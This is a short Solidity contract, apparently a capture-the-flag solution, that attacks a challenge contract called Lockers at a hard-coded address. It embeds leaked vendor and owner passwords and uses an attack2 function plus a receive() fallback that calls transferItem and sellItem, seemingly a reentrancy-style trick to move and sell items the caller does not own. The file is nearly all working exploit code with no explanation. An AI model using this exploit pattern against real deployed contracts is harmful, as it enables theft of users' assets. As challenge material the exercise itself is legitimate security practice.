// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Lockers.sol";

contract Contract{
	
	address public YOUR_CHALLENGE_CONTRACT_ADDRESS = address(0x63C4EE95E5bF1e9134ec8229426401D3d2f1e8eE);
	Lockers public creature = Lockers(YOUR_CHALLENGE_CONTRACT_ADDRESS);
	string vendor = "V3nd0r";
	string password2 = "P455_w0rD$$&&88@!~";
	string owner = "beliefspace";
	string name = "WizardsScepter";
	string password = "ss4#Nq7nNyKMfZ=XESnOzP2hk:SSRCzo2QPk4w~~";

	string owner_delete =  "perfectlyremnant";
	string name_delete = "CorruptedSword";
	string password_delete = "75kP#=abpPCGhIRiP#w8I3:YGq3.6aJ5utT=YxuH";

	function attack2() external {
		creature.getLocker(vendor, password2);
		creature.transferItem(name, vendor, password);
	}

	receive() external payable {
		//creature.retrieveItem(name_delete, password_delete);
		creature.transferItem(name, owner, password2);
		creature.sellItem(name, password);
	}


}
